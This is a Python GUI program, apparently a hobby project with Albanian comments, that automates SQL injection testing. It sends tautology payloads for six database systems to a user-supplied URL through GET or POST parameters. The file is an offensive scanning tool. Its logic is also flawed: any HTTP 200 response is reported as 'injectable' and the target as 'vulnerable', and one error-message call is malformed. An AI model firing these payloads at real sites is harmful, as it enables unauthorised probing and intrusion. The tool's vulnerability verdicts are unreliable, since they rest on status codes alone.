from tkinter import *
from PIL import ImageTk
import requests
import os

root = Tk()

root.title("Automate SQL Injection test")
root.geometry("800x533+200+70")
root.resizable(False, False)
image = ImageTk.PhotoImage(file="foto.jpg")
label = Label(root, image=image)
label.pack()

frame = Frame(root)
frame.place(x=140, y=20, width=550, height=500)
frame.config(bg="#91cbde")

validateLabel = Label(frame, text="", font=("Andalus", 8 , 'bold'), fg='#000000', bg="#91cbde")
validateLabel.place(x=80, y=0)

urlLabel = Label(frame, text="URL", font=("Andalus", 15, 'bold'), fg='#000000', bg="#91cbde")
urlLabel.place(x=80, y=20)

entryUrl = Entry(frame, font=("times new roman", 15))
entryUrl.place(x=80, y=50, width=405)

entryMethodLabel = Label(frame, text="METHOD", font=("Andalus", 15, 'bold'), fg='#000000', bg="#91cbde")
entryMethodLabel.place(x=80, y=90)

entryMethod = Entry(frame, font=("times new roman", 15))
entryMethod.place(x=80, y=120, width=405)

postParam = Label(frame, text="DATA", font=("Andalus", 15, 'bold'), fg='#000000', bg="#91cbde")
postParam.place(x=80, y=150)

entrypostParam = Entry(frame, font=("times new roman", 15))
entrypostParam.place(x=80, y=180, width=405)

txt = Text(frame, width=50, height=10, wrap=WORD)
txt.place(x=80, y=220)
txt.configure(state="disable")


def submitclicked():
    txt.configure(state="normal")
    if validimi():
        payloadsFunction()
    txt.configure(state="disable")

button = Button(frame, text='SUBMIT', activebackground="#00b0f0", activeforeground='white', fg='#000000',
                bg="#ea4343", font=("Arial", 15, 'bold'), command=submitclicked)
button.place(x=80, y=400, width=185)

def clearclicked():
    entryUrl.delete(0,END)
    entryMethod.delete(0, END)
    entrypostParam.delete(0, END)
    validateLabel.config(text=" ")
    txt.configure(state="normal")
    txt.delete('1.0', END)
    txt.configure(state="disable")

button1 = Button(frame, text='CLEAR', activebackground="#00b0f0", activeforeground='white', fg='#000000',
                bg="#ea4343", font=("Arial", 15, 'bold'), command=clearclicked)
button1.place(x=300, y=400, width=185)



def validimi():
    if not ((entryUrl.get().startswith("http://") or entryUrl.get().startswith("https://"))):
        validateLabel.config(text="URL should start with http:// or https://")
        return False
    elif not (entryMethod.get().upper() == "GET" or entryMethod.get().upper() == "POST"):
        validateLabel.config(text="Method should be GET or POST")
        return False
    elif (entryMethod.get().upper() == "GET" and len(entrypostParam.get()) > 1):
        validateLabel.config(text="GET method should not take parameters to the DATA field")
        return False
    elif (entryMethod.get().upper() == "POST" and len(entrypostParam.get()) < 1):
        validateLabel.config(text="POST method should take parameters to DATA field. Ex:value=1,value2=2")
        return False
    return True


def payloadsFunction():
    responseget = ""
    responseset = ""

    # Payloads per te gjetur databasen
    # Secila prej tyre funksionon ne 'dialekte' te caktuara
    find_dbms_payloads = {
        "mysql": "' or connection_id() = connection_id(); --",
        "postgresql": "' or pg_client_encoding() = pg_client_encoding(); --",
        "mssql": "' or @@CONNECTIONS = @@CONNECTIONS; --",
        "oracle": "' or RAWTOHEX('AB')=RAWTOHEX('AB'); --",
        "sqlite": "' or sqlite_version() = sqlite_version(); --",
        "msacess": "' or last_insert_rowid()>1; --"
    }

    # POST request
    if (entryMethod.get().upper() == "POST"):
        #Kontrollo per parametra,nqofse nuk ka shfaq mesazhin
        if (len(entrypostParam.get()) < 1):
            validateLabel.config("When POST entryMethod is specified you must pass the data argument. ")
        else:
            #Ndaj argumentet me ane te ' , ' psh name=1  > , < name2=2
            dataArgs = entrypostParam.get().split(",")
            postParams = {}
            # Per secilin argument merre vleren e duhur psh tek vlera1=5 , merre 5
            for i in dataArgs:  # argumentet jon me i
                i = i.split("=")
                postParams[i[0]] = i[1]
            requestList = {}
            # Per secilin parameter te payloads testoje
            for param in postParams:
                for payload in find_dbms_payloads:
                    data = postParams.copy()
                    data[param] = data[param] + find_dbms_payloads[payload]
                    resp = requests.post(entryUrl.get(), data)
                    if (resp.status_code == 200):
                        responseset += "[ " + payload + " ] " + "Argumet " + param + " seems to be injectable." + os.linesep
                        requestList[payload] = resp

            if (len(requestList) > 0):
                responseset += "Target is vulnerable." + os.linesep
            else:
                responseset += "Target seems secure. " + os.linesep

    # GET request
    elif (entryMethod.get().upper() == "GET"):
        requestList = {}
        # Per secilin parameter te payloads dergo request dhe trego pergjigjjen
        for payload in find_dbms_payloads:
            url = entryUrl.get() + find_dbms_payloads[payload]
            resp = requests.get(url)
            if (resp.status_code == 200):
                requestList[payload] = resp
                responseget += "[ " + payload + " ] " + "Url seems injectable. " + os.linesep
        if (len(requestList) > 0):
            responseget += "Target is vulnerable. " + os.linesep
        else:
            responseget += "Target seems secure." + os.linesep
    else:
        responseget += "" + os.linesep  # e kena bo per gabime tmundshme
    if (len(responseset) < 1):
        txt.insert(1.0, responseget)
    else:
        txt.insert(1.0, responseset)


root.mainloop()
